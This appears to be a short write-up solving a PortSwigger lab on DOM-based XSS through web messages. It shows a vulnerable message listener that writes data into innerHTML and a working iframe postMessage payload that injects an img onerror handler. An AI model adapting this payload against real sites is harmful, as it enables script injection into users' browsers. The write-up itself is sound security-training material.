
# DOM XSS using web messages

This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.

---------------------------------------------

Reference: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source

---------------------------------------------

Generated link: https://0acb00d70448250981b389ca008b00e6.web-security-academy.net/

Vulnerable code:



![img](images/DOM%20XSS%20using%20web%20messages/1.png)

```
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```



![img](images/DOM%20XSS%20using%20web%20messages/2.png)

Our payload will create a HTML element, an image which on load will call “print()”:

```
<iframe src="https://0acb00d70448250981b389ca008b00e6.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print() />','*')" style="width:100%;height:100%">
```


View exploit:



![img](images/DOM%20XSS%20using%20web%20messages/3.png)
